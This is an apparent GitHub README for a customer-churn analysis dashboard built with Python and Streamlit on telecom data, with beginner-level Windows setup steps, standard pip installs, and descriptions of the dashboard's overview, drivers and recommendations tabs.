# 📊 Customer-Churn-Analysis - Identify Why Your Customers Leave Today

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Warmupgroundwork927/Customer-Churn-Analysis)

This project helps you understand customer behavior. It analyzes telecom data to show why customers stop using services. You receive clear visual charts and actionable insights to improve business retention.

## 📋 Project Overview

Business leaders need data to make decisions. This application processes complex telecom datasets using SQL and Python. It transforms raw numbers into an interactive dashboard. You view churn drivers, perform deep data analysis, and read specific recommendations for your business.

The tool focuses on these areas:
* Finding patterns in customer accounts.
* Highlighting reasons for service termination.
* Creating visual maps of user activity.
* Providing specific steps to keep customers.

## 🛠️ Setting Up Your Environment

This application uses Python to calculate your results. You need the standard version of Python installed on your Windows machine to start the program.

1. Go to the official Python website at python.org.
2. Select the "Downloads" tab and choose the latest version for Windows.
3. Open the installer file once it finishes.
4. Check the box at the bottom that says "Add Python to PATH." This part is vital.
5. Click "Install Now" and wait for the process to finish.

Once Python is ready, you must install the parts that make the dashboard work. Open your command prompt by typing "cmd" in your Windows search bar. Type these lines one by one, pressing Enter after each:

- pip install pandas
- pip install streamlit
- pip install plotly

These commands download the necessary tools to run the project.

## 🚀 Running the Application 📈

After the installation, you start the application through the command prompt.

1. Navigate to the folder where you saved the files.
2. Click the address bar at the top of the folder window and type "cmd" then press Enter.
3. A black box appears. Type `streamlit run app.py` and press Enter.
4. Your default web browser opens automatically.
5. The dashboard displays the telecom analysis data.

## 💡 How to Use the Dashboard

The dashboard organizes data into tabs. You navigate the interface using the sidebar on the left side of your screen. 

* **The Overview Tab:** This page shows the total number of customers. It calculates the churn rate, which is the percentage of people leaving your service each month.
* **The Drivers Tab:** This page explains the "why." It uses charts to compare customers who stay versus those who leave. You look for patterns in contract types, monthly charges, and service tenure.
* **The Recommendations Tab:** This section lists logical steps for your business. It suggests targets for marketing campaigns based on the data trends found in your specific file.

## 🔍 Understanding Your Data

The tool uses standard CSV files to generate reports. If you want to analyze your own information, place your data file in the project folder. Ensure your headers match the sample format provided. The application reads these files instantly and updates the charts during your session.

## 🛠️ Troubleshooting Common Issues

If the application does not start, check these common items:

* **File Path:** Ensure you are inside the correct folder when you type the start command in your terminal.
* **Internet Connection:** The first run might look for updates. Stay connected to your network.
* **Required Tools:** Confirm that you completed every line in the installation step. Missing one command prevents the dashboard from loading properly.
* **Browser Issues:** If the page stays blank, refresh the browser window using F5.
